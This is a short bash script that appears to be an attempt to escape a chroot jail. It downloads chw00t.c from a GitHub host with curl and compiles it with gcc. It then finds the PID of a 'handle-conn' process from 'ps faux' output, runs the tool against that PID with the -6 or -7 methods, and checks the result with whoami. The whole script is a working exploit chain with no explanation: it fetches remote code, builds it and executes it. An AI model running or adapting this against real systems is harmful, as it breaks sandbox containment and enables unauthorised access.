#!/bin/bash
set +eo pipefail
curl -Lo lol.c https://github.com/emead-indeed/chw00t/raw/master/chw00t.c
ls -al 1>&2
/usr/bin/gcc lol.c -o lol -static 1>&2
ls -al 1>&2
ps faux &> lol.plist
grep handle-conn lol.plist &> lol.pdetails
head -n1 lol.pdetails &> lol.pdetail
chPPID=`awk '{print $2}' lol.pdetail`
echo ppid:$chPPID 1>&2
./lol -6 --pid $chPPID ||
	./lol -7 --pid $chPPID
ls -al
whoami
ps faux
